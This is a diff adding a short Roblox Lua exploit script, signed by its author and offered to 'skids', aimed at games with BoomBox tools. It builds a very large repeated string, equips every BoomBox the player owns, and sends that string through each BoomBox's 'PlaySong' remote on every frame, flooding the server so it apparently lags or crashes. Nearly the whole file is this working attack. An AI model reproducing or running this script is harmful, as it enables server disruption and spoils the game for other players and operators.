@@ -1,0 +1,27 @@
+
+--[[ MADE BY V0C0N1337 THIS SCRIPT WORKING BOOMBOX GAMES AND DOLLHOUSE RP ENJOY SKIDS OPEN SOURCE    JUST CREDITS ME :3 
+]]
+
+
+function gen(len)
+  local script = "V0C0NALWAYSBESTFEBYPASSXD                !!!!"
+  for i=1,12 do script = script..script end
+  return script
+end
+local sls = gen(20000)
+
+local bbs = {}
+for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+ if v.Name == 'BoomBox' then table.insert(bbs,v) end
+end
+for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+ if v.Name == 'BoomBox' then
+     v.Parent = game.Players.LocalPlayer.Character
+     table.insert(bbs,v)
+   end
+end
+game:GetService('RunService').RenderStepped:Connect(function()
+  for i=1,#bbs do
+      bbs[i].Remote:FireServer('PlaySong',sls)
+  end
+end)
